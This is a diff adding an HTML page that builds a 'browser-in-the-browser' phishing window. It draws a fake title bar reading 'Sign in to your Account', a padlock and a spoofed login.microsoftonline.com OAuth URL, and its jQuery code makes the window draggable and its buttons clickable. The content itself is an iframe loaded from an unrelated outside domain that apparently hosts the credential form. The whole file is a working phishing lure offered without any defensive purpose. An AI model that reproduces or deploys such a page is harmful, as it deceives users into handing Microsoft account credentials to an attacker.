@@ -1,0 +1,130 @@
+<!DOCTYPE html>
+<html>
+<head>
+	<meta charset="utf-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1">
+	<link rel="stylesheet" href="style.css">
+	<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
+</head>
+<body>
+<div id="window">
+<!-- Title bar start -->
+<div id="title-bar-width">
+	<div id="title-bar">
+		<div style="margin-top:5px;">
+			<img src="https://cdn-icons-png.flaticon.com/512/732/732221.png" width="16px" height="15px" id="logo">
+			<span id="logo-description">Sign in to your Account</span>
+		</div>
+
+		<div>
+			<span id="minimize">&#8212;</span>
+			<span id="square">□</span>
+			<span id="exit">✕</span>
+		</div>
+	</div>
+	<div id="url-bar">
+		<img src="https://png.pngtree.com/element_our/20190601/ourmid/pngtree-grey-lock-icon-free-illustration-image_1338619.png" width="20px" height="20px" id="ssl-padlock">
+		<span id="domain-name"></span>
+		<span id="domain-path">https://login.microsoftonline.com/organizations/oauth2/v2.0/auth?ytf7e82b8bd9e9db9gd92gd9e0e9fe0fh0hgff0hfh3hf9rfr39f339g93fb3b93br9f9rfn0rnf9rnfr3f3</span>
+	</div>
+</div>
+<!-- Content start -->
+<iframe id="content" src="http://web.naia.link" frameBorder="0"></iframe>
+</div>
+</body>
+
+<script>
+var minimize = document.getElementById("minimize");
+var square = document.getElementById("square");
+var exit = document.getElementById("exit");
+var titleBar = document.getElementById("title-bar");
+
+////////////////// Hover listeners //////////////////
+minimize.addEventListener('mouseover', function handleMouseOver() {
+  minimize.style.backgroundColor = 'rgba(0, 0, 0, 0.09765625)';
+  minimize.style.cursor = 'context-menu';
+});
+
+minimize.addEventListener('mouseout', function handleMouseOut() {
+  minimize.style.backgroundColor = '#d6dae0';
+  minimize.style.cursor = 'default';
+});
+
+square.addEventListener('mouseover', function handleMouseOver() {
+  square.style.backgroundColor = 'rgba(0, 0, 0, 0.09765625)';
+  square.style.cursor = 'context-menu';
+});
+
+square.addEventListener('mouseout', function handleMouseOut() {
+  square.style.backgroundColor = '#d6dae0';
+  square.style.cursor = 'default';
+});
+
+exit.addEventListener('mouseover', function handleMouseOver() {
+  exit.style.backgroundColor = '#E81123';
+  exit.style.cursor = 'context-menu';
+});
+
+exit.addEventListener('mouseout', function handleMouseOut() {
+  exit.style.backgroundColor = '#d6dae0';
+  exit.style.cursor = 'default';
+});
+
+titleBar.addEventListener('mouseover', function handleMouseOver() {
+  titleBar.style.cursor = 'context-menu';
+});
+
+titleBar.addEventListener('mouseout', function handleMouseOver() {
+  titleBar.style.cursor = 'default';
+});
+
+
+//////////////// Make window draggable start ////////////////
+// Make the DIV element draggable:
+var draggable = $('#window');
+var title = $('#title-bar');
+
+title.on('mousedown', function(e){
+	var dr = $(draggable).addClass("drag");
+	height = dr.outerHeight();
+	width = dr.outerWidth();
+	ypos = dr.offset().top + height - e.pageY,
+	xpos = dr.offset().left + width - e.pageX;
+	$(document.body).on('mousemove', function(e){
+		var itop = e.pageY + ypos - height;
+		var ileft = e.pageX + xpos - width;
+		if(dr.hasClass("drag")){
+			dr.offset({top: itop,left: ileft});
+		}
+	}).on('mouseup', function(e){
+			dr.removeClass("drag");
+	});
+});
+//////////////// Make window draggable end ////////////////
+
+
+////////////////// Onclick listeners //////////////////
+// X button functionality
+$("#exit").click(function(){
+    $("#window").css("display", "none");
+  });
+
+// Maximize button functionality
+$("#square").click(enlarge);
+
+function enlarge(){
+  if(square.classList.contains("enlarged")){
+    $("#window").css("width", "40%");
+    $("#title-bar-width").css('width', '100%');
+    $("#content").css("width", "100%");
+    $("#square").removeClass("enlarged");
+  }
+  else{
+    $("#window").css("width", "70%");
+    $("#title-bar-width").css('width', '100%');
+    $("#content").css("width", "100%");
+    $("#square").addClass("enlarged");
+  }
+}
+</script>
+</html>
